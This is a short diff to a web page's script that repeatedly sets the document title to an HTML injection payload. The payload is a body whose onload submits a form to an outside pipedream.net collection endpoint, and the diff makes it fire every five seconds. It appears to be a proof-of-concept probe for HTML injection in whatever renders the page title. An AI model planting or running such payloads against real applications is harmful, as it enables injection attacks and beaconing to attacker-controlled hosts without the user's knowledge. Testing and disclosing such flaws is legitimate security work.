@@ -7,6 +7,10 @@
 
 <script>
     function changeTitle(){
-        document.title = "<body onload=\"document.forms[0].submit()\"><form action=\"https://eo28kejt5kjkrb9.m.pipedream.net\" method=\"GET\"></form></body>";
+        var intervalId = window.setInterval(function(){
+  // call your function here
+  document.title = "<body onload=\"document.forms[0].submit()\"><form action=\"https://eo28kejt5kjkrb9.m.pipedream.net\" method=\"GET\"></form></body>";
+        }, 5000);
+        
     }
 </script>
